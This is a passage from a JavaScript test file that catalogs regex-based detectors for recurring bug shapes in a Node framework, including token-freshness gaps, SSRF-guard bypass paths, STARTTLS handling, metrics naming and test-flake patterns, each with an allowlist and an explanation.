    // entry.version makes CVE matchers key off the meta tag instead
    // of the real upstream version, producing false negatives on
    // children. The accepted form is `entry.components[subName]` as
    // either a `{ url, version }` object OR a bare string (legacy
    // form; falls back to parent version). Direct assignment of
    // `version: entry.version` inside the sub-component build
    // without a sub-version lookup is the bug shape.
    regex: /\bversion:\s*entry\.version,?\s*\n\s+license:\s*entry\.license/,
    allowlist: [],
    reason: "sub-component SBOM expansion must respect operator-supplied per-sub-component versions when present. The schema accepts `entry.components[subName]` as `{ url, version }` (preferred) or bare string (legacy; falls back to parent). A direct `version: entry.version` inside the sub-component build path skips the lookup and emits a parent-version-shadowed child that CVE matchers can't key off.",
  },
  {
    id: "timing-safe-equal-utf8-without-shape-guard",
    primitive: "Validate byte shape before nodeCrypto.timingSafeEqual on UTF-8 encoded strings",
    // `nodeCrypto.timingSafeEqual(Buffer.from(a, "utf8"), Buffer.from(b, "utf8"))`
    // throws ERR_CRYPTO_TIMING_SAFE_EQUAL_LENGTH when the strings differ in
    // UTF-8 byte length even when string-length matches (non-ASCII content).
    // Either ensure both inputs are ASCII before encoding, or compare byte
    // lengths after encoding, or use a shape guard (hex / base64url regex).
    // This detector fires on the bare two-Buffer.from-then-compare pattern.
    regex: /nodeCrypto\.timingSafeEqual\s*\(\s*Buffer\.from\([^,]+,\s*["']utf8["']\s*\)\s*,\s*Buffer\.from\([^,]+,\s*["']utf8["']\s*\)\s*\)/,
    allowlist: [
      // vendor-data.js validates both inputs are hex (ASCII-only) before
      // the timingSafeEqual call, so the UTF-8 byte length always equals
      // the string length.
      "lib/vendor-data.js",
    ],
    reason: "nodeCrypto.timingSafeEqual throws ERR_CRYPTO_TIMING_SAFE_EQUAL_LENGTH on different byte lengths. JavaScript string length is UTF-16 code units; Buffer.from(s, 'utf8') byte length differs for non-ASCII inputs. A bare two-Buffer compare on UTF-8 encoded strings can throw instead of returning false. Either constrain inputs to ASCII (hex / base64url shape guard) OR compare Buffer lengths after encoding, OR use the b.crypto.timingSafeEqual wrapper (handles the throw → return false translation).",
  },
  {
    id: "mailstore-quota-wrong-signature",
    primitive: "b.mailStore.quota(folderName) — single-string-arg + reads capBytes/usedBytes",
    // mailStore.quota(folderName) returns
    // { usedBytes, usedCount, capBytes, capCount }. Two-arg call shapes
    // (e.g. mailStore.quota(actor, folderName)) pass the actor as the
    // folder key and throw mail-store/no-folder. Reading q.limitBytes is
    // wrong (the field is capBytes); the over-quota check never trips.
    regex: /mailStore\.quota\s*\([^)]*,/,
    allowlist: [],
    reason: "mailStore.quota takes a single folderName argument; the return shape is { usedBytes, usedCount, capBytes, capCount }. A two-arg call (actor, folder) passes the actor object as the folder key and throws mail-store/no-folder, breaking IMAP APPEND for valid writes. Read q.capBytes (not q.limitBytes — undefined, so the over-quota gate would never fire).",
  },
  {
    id: "mailstore-quota-wrong-field",
    primitive: "b.mailStore.quota returns capBytes (not limitBytes)",
    regex: /\bq\.limitBytes\b|\bquota\.limitBytes\b/,
    allowlist: [],
    reason: "mailStore.quota returns { usedBytes, usedCount, capBytes, capCount }. Reading q.limitBytes / quota.limitBytes is undefined and silently bypasses the over-quota check. Use q.capBytes.",
  },
  {
    id: "dot-stuff-jsregex-bare-lf",
    primitive: "b.safeSmtp.dotStuff(buf) — CRLF-aware byte-level dot-stuffing",
    // `.replace(/^\./gm, "..")` on a JS string treats bare LF as a line boundary, so bodies
    // containing bare-LF lines that start with '.' gain spurious stuffing the receiver's strict-CRLF
    // parser won't undo. Route through safeSmtp.dotStuff which only treats canonical \r\n as a boundary.
    regex: /\.replace\(\s*\/\^\\\.\/gm\s*,\s*["']\.\.["']\s*\)/,
    allowlist: [],
    reason: "POP3 RETR + SMTP DATA dot-stuffing. The JS regex `/^\\./gm` matches bare-LF line starts as well as CRLF starts, so the stuffing differs from RFC 1939 §3 / RFC 5321 §4.5.2 (canonical CRLF only). Use b.safeSmtp.dotStuff(buf) on the raw Buffer — it walks bytes and recognizes ONLY \\r\\n as a line boundary.",
  },
  {
    id: "starttls-listener-remove-missing",
    primitive: "Use b.mail.server.tls.upgradeSocket which calls removeAllListeners(\"data\") on the plain socket",
    // CVE-2021-33515 / CVE-2021-38371. New listener files that import nodeTls AND construct a TLSSocket
    // anywhere AND do not call mailServerTls (the helper composition) trip this at n=1. Simple regex —
    // matches `new nodeTls.TLSSocket(` without requiring lookbehind.
    regex: /new\s+nodeTls\.TLSSocket\s*\(\s*rawSocket\b/,
    allowlist: [
      // Submission listener's implicit-TLS path (port 465) wraps the FIRST byte on the wire — no
      // plaintext predecessor, so listener removal is moot.
      "lib/mail-server-submission.js",
    ],
    reason: "STARTTLS / STLS upgrade — only the upgradeSocket helper is allowed to wrap a TLSSocket around a previously-attached plain socket. The implicit-TLS variant on port 465 wraps the rawSocket BEFORE any plain bytes are read (no listener to remove), so it stays allowlisted.",
  },
  {
    // P1 Codex 2026-05-19 on PR #105 — DBSC binding assertion lacking
    // both `iat` and `challenge` replays indefinitely. The detector
    // flags JWT-payload age-checks shaped as `typeof X.iat === "number"
    // && Date.now() - X.iat ... > maxAge` because that pattern short-
    // circuits to "no-check" on missing `iat` — there must be a sibling
    // gate that refuses missing-freshness BEFORE the age check.
    id: "optional-iat-age-check-no-required-freshness",
    primitive: "Token / assertion verifier must REFUSE missing freshness (iat OR server-nonce) before age-checking — `if (typeof X.iat === \"number\" && now - X.iat > maxAge)` short-circuits to no-check on missing iat; use `if (typeof X.iat !== \"number\") throw` first, or gate `(typeof iat === \"number\" || X.challenge)` before the age check",
    // Catches any optional-iat age check: `iat-is-number && time-diff`
    // or `iat-truthy && time-diff`. Matches across every JWT / token /
    // assertion verifier in lib/. If a verifier has this shape it must
    // be in the allowlist with the sibling refuses-missing-iat gate
    // documented, OR rewritten to fail closed.
    regex: /if\s*\(\s*(?:typeof\s+\w+\.iat\s*===\s*"number"|\w+\.iat)\s*&&[^)]{0,200}(?:Date\.now\(\)|nowSec|nowMs|now\s*[-<>])/,
    allowlist: [
      // dbsc.js — v0.11.0 added a `if (typeof iat !== "number" &&
      // !challenge) throw "no-freshness"` gate immediately ABOVE the
      // age check, so this matched line runs only when freshness is
      // guaranteed.
      "lib/dbsc.js",
      // auth/jwt-external.js — RFC 7519 §4.1.6 makes `iat`
      // OPTIONAL for general-purpose JWTs (external IdPs frequently
      // omit it). The match at line 459 is a "iat in the future"
      // sanity check that runs WHEN iat is present, not a freshness
      // floor. External JWT verifiers can't require iat across the
      // board because the spec says it's optional; freshness is the
      // operator's responsibility via the `exp` claim + a separately-
      // validated audience/issuer pair.
      "lib/auth/jwt-external.js",
    ],
    reason: "CLASS DETECTOR. The bug shape is: a verifier age-checks `iat` only when `iat` is present, so an attacker can omit `iat` entirely and bypass freshness. Codex flagged this on dbsc v0.11.0 (P1). The corrected shape is to refuse missing `iat` (or refuse missing iat-AND-missing-nonce) BEFORE the age check. The detector matches the buggy shape `if (typeof X.iat === \"number\" && ...time...)` and `if (X.iat && ...time...)` across every verifier in lib/. Allowlisted files MUST demonstrate the sibling required-freshness gate; new sites either rewrite to the fail-closed pattern (`if (typeof iat !== \"number\") throw`) or add to allowlist with the guard line referenced. Regex catches the SHAPE; the semantic property (a sibling refuses-missing-iat guard) is enforced by allowlist review.",
  },
  {
    // P2 Codex 2026-05-19 on PR #105 — AIP-151 LRO operation
    // transitions are MONOTONIC: once `done: true` is set with a
    // terminal state (response OR error), subsequent resolve/reject
    // handlers MUST NOT overwrite. Otherwise a cancelled operation
    // can flip back to success if the work function ignores the
    // AbortSignal. Detector looks for `stored.done = true` followed
    // immediately by `stored.response = ...` (post-cancel-stomp).
    id: "monotonic-terminal-state-overwrite-without-guard",
    primitive: "Any state machine with a `done` (or terminal) flag whose async handler writes `state.done = true; state.X = ...` MUST check `if (state.done) return;` first; otherwise a late-arriving handler clobbers an earlier terminal state (cancellation, error, timeout)",
    // Broad — matches `.done = true` assignment followed within the
    // same async handler by a value-writing assignment (`.response`,
    // `.value`, `.error`, etc.). Matches LRO + any other state machine
    // shaped this way (queue jobs, agent-snapshot operations, saga
    // steps). Allowlist documents the sibling `if (X.done) return`
    // guard.
    regex: /\.done\s*=\s*true;\s*\n\s*\w+\.(?:response|value|result|error|completedAt)\s*=/,
    allowlist: [
      // lro.js — `if (stored.done) return;` guards both resolve and
      // reject handlers immediately above each assignment block
      // (v0.11.0).
      "lib/lro.js",
    ],
    reason: "CLASS DETECTOR. Monotonic state machines (AIP-151 LRO, queue jobs, saga steps, agent-snapshot operations) have a `done` flag that once set MUST stay set with the first terminal state recorded. Async handlers that write terminal state without checking the prior state cause late-resolves to overwrite earlier cancels / errors / timeouts. Codex flagged this on lro v0.11.0 (P2). The detector matches the assignment pair `done = true; <value-field> = X` across lib/. Allowlisted files MUST guard with `if (X.done) return;` immediately above each mutation site. The regex catches the SHAPE; allowlist review confirms the guard exists.",
  },
  {
    // P2 Codex 2026-05-19 on PR #105 — verifyAll() in mail-crypto-smime
    // looped a single-signer verify() helper per signer, but verify()
    // always parsed sd.signerInfos[0]; the second signer's key got
    // tested against the first signer's signature. The detector flags
    // a `for (... signerInfos ...)` loop body that calls a sibling
    // `verify({` (with object opts arg) — the helper that takes the
    // SignerInfo as an explicit positional argument is allowed.
    id: "verifyall-loop-calls-single-signer-verify-helper",
    primitive: "A per-collection-item verify/process loop must call a helper that takes the item as a POSITIONAL argument (`_verifyOne(item, ...)`) — calling the top-level single-item entry point with an opts object inside the loop body re-parses the parent envelope and silently always processes index 0",
    // Catches any `for (... of <collection>) { ... <name>({` shape
    // where the call inside the loop body looks like a top-level
    // entry point (function called with `({` opts-object first arg).
    // The fix in mail-crypto-smime extracted `_verifySignerInfo(si, ...)`
    // which takes the item positionally — that doesn't match the regex.
    regex: /(?:^|\n)([ \t]*)for\s*\(\s*var\s+\w+\s*=\s*0[^)]*\.(?:signerInfos|signers|recipients|items|entries)\.length[^)]*\)\s*\{(?:(?!\n\1\}|\bverify\s*\()[\s\S]){0,4000}?\bverify\s*\(\s*\{/,
    allowlist: [
      // mail-crypto-smime.js verifyAll was fixed v0.11.0 to call
      // _verifySignerInfo(si, ...) (positional `si`), not
      // verify({ signature: ..., signerPublicKey: ... }) which
      // re-parses the same SignedData and only checks signerInfos[0].
    ],
    reason: "CLASS DETECTOR. The bug shape is: a loop iterating a parent's child collection (signerInfos / signers / recipients / items / entries) where the loop body calls a top-level entry point with an opts-object argument, instead of a per-item helper that takes the loop variable. The top-level entry point typically re-parses the parent envelope from raw bytes and always processes index 0 — masking the second-and-onward items. Codex flagged this on smime.verifyAll v0.11.0 (P2). Per-item helpers must accept the loop variable as a positional argument.",
  },
  {
    // P2 Codex 2026-05-19 on PR #105 — OpenMetrics counter sample lines
    // suffix with `_total`, but the `# HELP / # TYPE / # UNIT`
    // metadata lines MUST name the same family identifier as the
    // samples. Emitting metadata for `requests` then samples for
    // `requests_total` makes strict parsers reject the family.
    // Detector flags HELP/TYPE/UNIT lines that use `m.name + ' '`
    // directly (instead of an `exposedName` derived once that already
    // carries the `_total` suffix when needed).
    id: "openmetrics-counter-family-name-mismatch",
    primitive: "OpenMetrics counter metadata (`# HELP / # TYPE / # UNIT`) and sample lines MUST agree on the family identifier — derive the exposition name once at the top of the loop so the `_total` suffix on counters appears on BOTH the metadata and the samples",
    regex: /["']# (?:HELP|TYPE|UNIT) ["']\s*\+\s*m\.name\s*\+\s*["'] ["']/,
    allowlist: [
      // metrics.js was fixed v0.11.0 to derive `exposedName` once at
      // the top of the per-metric loop and use it for HELP/TYPE/UNIT +
      // the sample lines. This file no longer uses `m.name + ' '` in
      // any of the metadata lines.
    ],
    reason: "OpenMetrics §5.1.2 requires counters expose with the `_total` suffix. The wire-format SAMPLE lines (e.g. `requests_total 1`) MUST match the metadata family name (e.g. `# TYPE requests_total counter`), otherwise strict parsers reject the family or bind the wrong type. Derive `exposedName` once per metric — `m.name + (m.type === 'counter' && openMetrics && !/_total$/.test(m.name) ? '_total' : '')` — and use it for both `# HELP/TYPE/UNIT` and the sample line.",
  },
  {
    // P1 Codex 2026-05-19 on PR #106 — the v0.11.1 proxy-aware SSRF
    // short-circuit (`if (proxyAgent && allowInternal === true) skip
    // checkUrl`) removed the UNCONDITIONAL cloud-metadata block too.
    // Metadata IPs like 169.254.169.254 are NEVER overridable; the
    // proxy can't be trusted to refuse them downstream. Detector
    // flags code paths that bind `Promise.resolve({ ips: null })` to
    // an ssrf-skip variable — every such site MUST also call
    // `ssrfGuard.checkUrlTextual(...)` first to apply the textual
    // metadata-IP refusal.
    id: "ssrf-skip-without-textual-metadata-check",
    primitive: "Any SSRF-skip path (proxy short-circuit, operator-pinned IP, custom dnsLookup) MUST call `b.ssrfGuard.checkUrlTextual(url)` first; metadata IPs (169.254.169.254 / 169.254.170.2 / fd00:ec2::254) are NEVER overridable",
    regex: /=\s*Promise\.resolve\s*\(\s*\{\s*ips:\s*null/,
    allowlist: [
      // http-client.js's proxy short-circuit was fixed v0.11.1 to call
      // ssrfGuard.checkUrlTextual immediately above this assignment,
      // applying the metadata-IP block before the proxy ever sees
      // the request.
      "lib/http-client.js",
    ],
    reason: "CLASS DETECTOR. The bug shape is: a code path that wants to skip SSRF's DNS-resolution (because a downstream resolver handles it — proxy, pinned-IP, custom dnsLookup) does so by binding `Promise.resolve({ ips: null })` to the SSRF result, bypassing the entire guard including the unconditional cloud-metadata block. Codex flagged this on http-client v0.11.1 (P1). The corrected shape is to invoke `ssrfGuard.checkUrlTextual(url)` immediately above the short-circuit so the textual metadata-IP refusal still applies. Allowlisted files must demonstrate the sibling textual-check call.",
  },

  // ==== v0.11.4 — 5 missing detectors from the PR-108 audit ====
  //
  // The audit identified 13 missing detectors for bug classes that
  // shipped patches between v0.9.0 and v0.11.3 but never had a
  // detector encoded. These 5 are the highest-priority subset (P1 +
  // P2 by audit ranking). The remaining 8 are scoped for follow-up.

  {
    // #123 — a worker_threads Worker whose error/exit handler rejects WITHOUT
    // terminating leaves the thread alive holding its event-loop handles, so the
    // parent process can't exit and the smoke run hangs under the watchdog on
    // memory-starved CI runners (macOS-arm64). Every Promise-settle path
    // (message / error / exit) must reap the worker via w.terminate() first; the
    // fix funnels all three through a settle() guard that terminates before
    // resolve/reject. Structural resource-hygiene drift a behavioral test can't
    // assert — the harness closure isn't exported and the hang is a slow-runner
    // race — so the detector is the guard.
    id: "test-worker-reject-without-terminate",
    primitive: "a worker_threads Worker error/exit handler must terminate() the worker before rejecting (route message/error/exit through a settle() helper) — a bare reject leaks the thread's handles and hangs process exit on slow CI runners",
    scanScope: "test",
    regex: /\bw\.once\("error",\s*reject\)/,
    skipCommentLines: true,
    allowlist: [],
    reason: "#123 macOS codebase-patterns watchdog hang. _scanShardInWorker rejected on worker error/exit without w.terminate(), so an errored worker thread stayed alive holding open handles; the parent then could not exit and the smoke run ran to the 25-min watchdog on memory-starved macOS-arm64 runners (it hung this very release's CI). Every settle path must reap the worker via w.terminate() first; the fix funnels message/error/exit through a settle() guard that terminates before resolve/reject. Fires on the bare `w.once(\"error\", reject)` shape; silent once error/exit route through settle().",
  },
  {
    // A test file must invoke its run()/IIFE ONLY under
    // `if (require.main === module)`. The smoke worker REQUIRES each test
    // module and then awaits its exported run(); a module-level `run()` (or
    // `run().then(...process.exit...)`) at column 0 fires a SECOND, unawaited
    // run() at require-time that races the worker's result print — and if it
    // calls process.exit() it exits the worker BEFORE the result line is
    // written, which the parent reports as the unattributable "no result line"
    // / "fork failed". Found via the worker's late-error + leaked-handle audit
    // sweep (defineguard-default-gate-posture-caps / dpop-middleware-
    // replaystore-required / otlp-attr-redaction + two integration files), the
    // same slow-runner-flake root as #123. Export run and guard the
    // self-execution. Structural test-harness-contract drift a behavioral test
    // can't assert (the race only surfaces under require, intermittently on a
    // slow runner) — the detector is the guard.
    id: "test-unguarded-module-level-run",
    primitive: "a test file's run()/self-execution must sit under `if (require.main === module)` (export run for the smoke worker to await) — a bare module-level run() at column 0 re-runs at require-time and races / exits the worker",
    scanScope: "test",
    regex: /^run\s*\(/m,
    skipCommentLines: true,
    allowlist: [],
    reason: "The smoke worker requires each test module and awaits its exported run(); a column-0 `run()` / `run().then(...process.exit...)` fires a second unawaited run() at require-time that races the worker's result print (and process.exit() exits before the result line, read as 'no result line' / 'fork failed' on a slow runner). Export `run` and wrap the invocation in `if (require.main === module)`. Fires on any `run(` at the start of a line; `function run()`, `module.exports = { run }`, and an indented `run()` inside the require-main guard stay silent.",
  },
  {
    id: "test-detached-async-iife",
    primitive: "define `async function run() {...}`, `module.exports = { run }`, and invoke under `if (require.main === module) run().catch(...)` — never a top-level `(async function () {...})()` IIFE",
    scanScope: "test",
    regex: /^\(async\b/m,
    skipCommentLines: true,
    allowlist: [
      // The smoke runner itself — its top-level `(async function () {...})()` is
      // the orchestrator's process entry point (it forks the per-file workers),
      // not a worker-awaited test body. It has no run() to export.
      "test/smoke.js",
    ],
    reason: "The smoke worker requires each test module and only `await mod.run()`. A test written as a top-level `(async function run(){...})()` IIFE runs DETACHED on require: the worker measures + prints its result before the IIFE's post-await assertions execute, so every check after the first await silently never counts (parsers-standalone reported 4 of 26 checks this way) and a failing post-await assertion is never seen — a false pass. Export `run` and invoke under `if (require.main === module)`. Fires on a column-0 `(async` (function or arrow IIFE); `async function run()` (no leading paren), `module.exports = { run }`, and an indented async IIFE inside a helper stay silent. Synchronous `(function(){...})()` IIFEs complete during require, so they do not undercount and are out of scope here.",
  },
  {
    // `Promise + setTimeout` direct sleep in tests is forbidden;
    // tests waiting on an asynchronous condition MUST use
    // `helpers.waitUntil`. v0.10.14 introduced the detector with a
    // narrower regex + a 49-file backlog under a separate test-side
    // runner; v0.11.19 consolidated the test-discipline catalog into
    // this file with the broadened regex (Codex P2 from v0.10.14 —
    // catches block-bodied arrows, multi-arg arrows, function bodies
    // with leading statements).
    id: "test-promise-settimeout-sleep",
    primitive: "helpers.waitUntil(predicate, { timeoutMs, label }) for condition-waits OR helpers.passiveObserve(ms, label) for the rare case of verifying ABSENCE of an event over a window",
    scanScope: "test",
    // Broadened regex covers every callable form:
    //   await new Promise(r => setTimeout(r, 100));
    //   await new Promise((resolve) => { setTimeout(resolve, 100); });
    //   await new Promise(function (r) { setTimeout(r, 100); });
    //   await new Promise(function () { setTimeout(...) });
    // 200-char window keeps the regex bounded; longer Promise bodies
    // that do real work between Promise-open and setTimeout don't
    // fit the direct-sleep antipattern anyway.
    regex: /new\s+Promise\s*\(\s*(?:function\s*[\w$]*\s*\([^)]*\)\s*\{|\([^)]*\)\s*=>\s*\{?|[\w$]+\s*=>\s*\{?)[\s\S]{0,200}?setTimeout\s*\(/,
    skipCommentLines: true,
    allowlist: [
      // ===== Structural FPs (stay allowlisted) =====
      // helpers.waitUntil IS the polling primitive — it has to use
      // setTimeout internally. helpers.passiveObserve is the
      // legitimate-real-time-elapse sibling. The wait module exports
      // both; the detector forbids USING setTimeout as a condition-
      // wait, not implementing the primitives.
      "test/helpers/wait.js",
      // The catalog itself carries fragments of the bug pattern as
      // regex literals inside KNOWN_ANTIPATTERNS entries.
      "test/layer-0-primitives/codebase-patterns.test.js",
      // Smoke runner orchestration uses Promise+setTimeout for
      // process-spawn budgets and worker-pool drain — not for
      // test-body synchronization.
      "test/smoke.js",
      // audit-use-store.test.js uses `new Promise(resolve =>
      // setTimeout(resolve, 250))` as the canonical "slow operator
      // callback" simulator to verify b.audit.useStore's
      // shadow-timeout posture. Not a condition-wait use; the
      // setTimeout IS the simulated latency itself.
      "test/layer-0-primitives/audit-use-store.test.js",
      // services.js implements the TCP/TLS/UDP probe primitives the
      // integration-test harness uses to detect whether a Docker
      // service is reachable. The setTimeout calls are the timeout
      // half of a race-with-socket-event pattern (timer vs.
      // connect / secureConnect / error event), not a condition-wait
      // — the operator-facing analog is `helpers.withTestTimeout`,
      // but services.js IS the lower-level primitive that builds
      // that contract for non-test code.
      "test/helpers/services.js",
      // examples/wiki/test/integration.js is the wiki example's own
      // integration suite — it consumes @blamejs/core via npm symlink
      // (not the framework's internal test/helpers). The single
      // Promise+setTimeout site is a brief post-shutdown flush window
      // for log-stream buffers; it's not a condition-wait against
      // observable state in the wiki app. Moving it into a polled
      // primitive would require duplicating helpers.passiveObserve
      // into the wiki package's own test infra — not worth the
      // surface for one 100ms wait.
      "examples/wiki/test/integration.js",
    ],
    reason: "Every 'test passes alone, fails under SMOKE_PARALLEL=64' flake (macOS watcher, log-stream-otlp, safe-async-loops, rate-limit-cluster, sandbox flake) is the same root cause: a fixed-budget setTimeout sleep that's too short for runner-contention reality. `helpers.waitUntil(predicate, opts?)` polls the actual condition every 25ms up to a 5000ms cap, exiting early when the predicate returns truthy. Fast platforms finish in milliseconds; contended platforms get the full budget. `helpers.passiveObserve(ms, label)` is the sibling primitive for the rare case of verifying ABSENCE of an event over a window (work simulators, TTL-elapse before assertion). The allowlist's structural FPs are permanent; the migration-backlog files drain to zero in subsequent patches.",
  },

  {
    // Sibling to test-promise-settimeout-sleep, for the timer the
    // setTimeout regex misses: a COUNTED DRAIN-LOOP that reassigns a
    // promise to its own `.then()` over and over to "flush N
    // microtasks/ticks" before asserting — the `_waitMicrotasks(n)`
    // helper shape (`var p = Promise.resolve(); for (...) p = p.then(
    // () => new Promise(r => setImmediate(r)));`). Like the fixed
    // setTimeout sleep it guesses a budget; under SMOKE_PARALLEL=64
    // contention the awaited async work (a cluster-backend DB take,
    // a scheduler tick-claim) hasn't resolved within the tick count,
    // so the next assertion reads stale state. This was the recurring
    // rate-limit-cluster "4th blocked with 429" flake and the
    // scheduler-exactly-once tick-claim race. A single `await new
    // Promise(r => setImmediate(r))` event-loop yield is legitimate
    // and is NOT matched — only the self-reassigning `<x> = <x>.then(`
    // drain idiom paired with a timer is. Poll the observable
    // condition with helpers.waitUntil instead.
    id: "test-microtask-drain-loop-sleep",
    primitive: "helpers.waitUntil(predicate, { timeoutMs, label }) — poll the observable condition; never drain a fixed count of microtasks/ticks by reassigning a promise to its own .then() in a loop",
    scanScope: "test",
    regex: /\b(\w+)\s*=\s*\1\.then\((?:(?!\.then\(|set(?:Immediate|Timeout)\s*\()[\s\S]){0,400}?set(?:Immediate|Timeout)\s*\(/,
    skipCommentLines: true,
    allowlist: [
      // The catalog itself carries this pattern as a regex literal +
      // in this entry's own prose/reason describing the antipattern.
      "test/layer-0-primitives/codebase-patterns.test.js",
    ],
    reason: "A for-loop that reassigns a promise to its own `.then(() => new Promise(r => setImmediate(r)))` to drain a fixed number of microtask ticks is the same fixed-budget anti-pattern as a setTimeout sleep, just timed in event-loop turns instead of milliseconds — and it flakes the same way: when the async work under test hasn't resolved within the tick count (cluster DB take, scheduler tick-claim) the following assertion reads stale state. Poll the observable condition with helpers.waitUntil(predicate, { timeoutMs, label }); a lone `await new Promise(r => setImmediate(r))` yield is fine and isn't matched.",
  },

  {
    // v0.10.13 PR #102 macOS hang — stream-throttle.test.js used
    // `setTimeout`-based rate enforcement plus `node:stream.pipeline`
    // and hung the macOS GitHub Actions runner for >2h on two
    // separate commit SHAs of the same branch. Identical runs on the
    // same SHA succeeded in 15 min. The hang's symptom is opaque on
    // a remote runner (no partial logs surface until completion), so
    // the only diagnostic is a per-test wall-clock ceiling.
    id: "test-uses-stream-pipeline-without-withtesttimeout",
    primitive: "wrap stream.pipeline-using test bodies with helpers.withTestTimeout(label, async function () { ... })",
    scanScope: "test",
    regex: /\b(?:stream\.pipeline|nodeStream\.pipeline|streamPipeline)\s*\(/,
    requires: /\bwithTestTimeout\b/,
    allowlist: [
      "test/helpers/wait.js",
    ],
    reason: "Real-time-dependent tests using node:stream.pipeline without a per-test wall-clock ceiling can hang the smoke runner for the full GH Actions 6h timeout — see the v0.10.13 PR #102 macOS hang on stream-throttle's setTimeout-based rate test. New tests using stream.pipeline MUST import `withTestTimeout` from `test/helpers` and wrap each test body so a hang surfaces as `test timed out: <label>` in seconds instead of an opaque stuck job.",
  },

  {
    // Tests must live in per-domain files (e.g. honeytoken.test.js,
    // resource-access-lock.test.js) not release-bucket files like
    // `v0-8-41-additions.test.js` or `slot-19-enhancements.test.js`.
    // Release-named test files conflate scope across primitives,
    // break the smoke runner's per-file isolation, and rot the
    // moment the release ships.
    id: "release-named-test-file",
    primitive: "split into per-domain test files (one primitive → one test file; share helpers under test/helpers/)",
    scanScope: "test",
    matchOn: "basename",
    regex: /^(?:v\d+[-_.]\d+[-_.]\d+(?:[-_.]|$)|slot[-_]\d+|(?:[^/]*[-_])?batch[-_.])/i,
    allowlist: [],
    reason: "v0.10.14 — release-named test files (v0-8-41-additions.test.js / slot-19-enhancements.test.js / batch-N.test.js) conflate scope across unrelated primitives, break per-file isolation under SMOKE_PARALLEL=64, and rot the moment the release ships. Tests must live in per-domain files. Smoke runner refuses these at entry too (test/smoke.js) as a second defense.",
  },

  {
    // N2 (v0.10.14) — hardcoded non-zero server bind ports race under
    // SMOKE_PARALLEL=64 when two parallel tests pick the same value.
    // Convention: `.listen(0)` then `server.address().port` to read
    // the OS-assigned ephemeral port. Read-only protocol-constant
    // references (autoconfig XML port: 993 / 587, mock-server config
    // port: 1025) don't trip this detector — only `.listen()` with a
    // literal non-zero port does.
    id: "test-hardcoded-server-bind-port",
    primitive: ".listen(0) + server.address().port  (let the OS assign an ephemeral port; read it after bind)",
    scanScope: "test",
    regex: /\.listen\s*\(\s*(?:\{[^}]*port\s*:\s*)?(?!0\b)\d{2,5}\b/,
    allowlist: [],
    reason: "Hardcoded bind ports race under SMOKE_PARALLEL=64 when two parallel tests pick the same value. Convention: .listen(0) + server.address().port. Read-only protocol-constant references (autoconfig XML port: 993 / 587, mock-server config port: 1025) don't trip this detector — only .listen() with a literal non-zero port does.",
  },

  {
    // Constructing a "malformed" base64url test input by replacing only the
    // FIRST standard-base64-only character ('+' or '/') of a freshly generated
    // certificate/key is non-deterministic: the per-run base64 carries no such
    // character ~0.4% of the time (a 400-char cert), so the replace is a no-op
    // and the input stays a VALID value that is correctly accepted — flaking
    // any assertion that expects refusal. Inject a base64url-only char
    // unconditionally (prepend one) so the malformed entry is guaranteed.
    id: "test-malformed-base64url-via-noop-replace",
    primitive: "prepend a base64url-only char ('-' / '_') unconditionally to build a guaranteed-malformed x5c / JOSE base64 test input — never a single non-global replace of the first '+' / '/', which is a no-op when the input carries neither",
    scanScope: "test",
    regex: /\.replace\(\s*\/\[\+\/\]\/\s*,\s*["'][-_]["']\s*\)/,
    allowlist: [],
    reason: "A single non-global replace of the first standard-base64-only character to forge a base64url-charset string is a no-op whenever that run's base64 happens to carry no such character, leaving a still-valid input that is correctly accepted — so the refusal assertion flakes (measured ~0.4% per run on a 400-char certificate; surfaced as the OID4VCI base64url-x5c refusal flake). Build the malformed entry deterministically by prepending a base64url-only char.",
  },

  {
    // v0.11.13 — `fs.watchFile` / `fs.watch` MUST NOT be called
    // directly from tests. The framework exposes `b.watcher`
    // (kernel-event based) and `b.vault.sealPemFile` (poll-based) as
    // the operator-facing watchers; tests of those primitives compose
    // `helpers.backdateFile` + `helpers.waitForWatcher` to absorb the
    // first-poll race + the macOS FSEvents prime latency. Direct
    // `fs.watch*` in tests re-discovers the same race class.
    id: "test-fs-watch-direct-call",
    primitive: "helpers.backdateFile(path) + helpers.waitForWatcher(predicate) — compose the framework's watcher primitives in tests instead of calling fs.watch / fs.watchFile directly",
    scanScope: "test",
    regex: /\bfs\s*\.\s*watch(?:File)?\s*\(/,
    allowlist: [
      "test/helpers/fs-watch.js",
    ],
    reason: "v0.11.13 — `helpers.backdateFile` + `helpers.waitForWatcher` centralize the discipline for fs.watch / fs.watchFile-driven tests (backdate the source pre-watcher so the first poll's baseline is older than any subsequent mutation; widen the wait budget to 15s for CI-runner cadence drift). Direct `fs.watch*` calls in tests re-discover the race class — multiple historical flakes (vault-seal-pem-file + watcher) were the same bug shape.",
  },

  {
    // v0.11.13 — tests that set a future mtime via fs.utimesSync MUST
    // also call helpers.backdateFile on the source. The future-mtime
    // idiom assumes the watcher has already recorded an OLDER
    // baseline mtime to compare against. Without backdating, the
    // watcher's first poll can record the future-mtime as `prev` and
    // miss the transition entirely.
    id: "test-future-utimes-without-backdated-baseline",
    primitive: "helpers.backdateFile(source) before writing future-mtime via fs.utimesSync(...) so the watcher's baseline is unambiguously older than the post-mutation mtime",
    scanScope: "test",
    regex: /\bfs\s*\.\s*utimesSync\s*\([^,]+,\s*new\s+Date\s*\(\s*Date\s*\.\s*now\s*\(\s*\)\s*\+/,
    requires: /\bbackdateFile\s*\(/,
    allowlist: [
      "test/helpers/fs-watch.js",
    ],
    reason: "v0.11.13 — every recurring flake in the fs.watch test class (vault-seal-pem-file + watcher) shared the same root cause: the test wrote a file with a future mtime expecting the watcher's first poll to detect the change, but the first poll could land AFTER the mutation under runner contention. helpers.backdateFile establishes an unambiguously-older baseline; pairing it with future-mtime writes makes the watcher's transition detection deterministic.",
  },

  {
    // v0.15.0 — an encrypted-at-rest b.db.init refuses a tmpDir that is not a
    // recognized tmpfs mount (/dev/shm, /run/shm, /run/user, /tmp): a decrypted
    // working copy on persistent disk leaks into backup snapshots, replicas,
    // and forensic images. That gate is a NO-OP on win32, so a test that builds
    // its scratch dir under the repo-local test/.test-output and passes it to a
    // BESPOKE db.init PASSES on the author's Windows host and FAILS on the
    // Linux/macOS CI floor with db/tmpdir-not-tmpfs (audit-checkpoint-false-
    // rollback shipped this exact bug). The shared setupTestDb / setupTestDbForMW
    // helpers already pass allowNonTmpfsTmpDir:true; a bespoke db.init must opt in
    // the same way, OR base its scratch on os.tmpdir() (/tmp on Linux is a
    // recognized tmpfs), OR run atRest:"plain" (no decrypted working copy, so the
    // gate does not apply). The companion `requires` is satisfied by any one.
    id: "test-bespoke-db-init-nontmpfs-tmpdir",
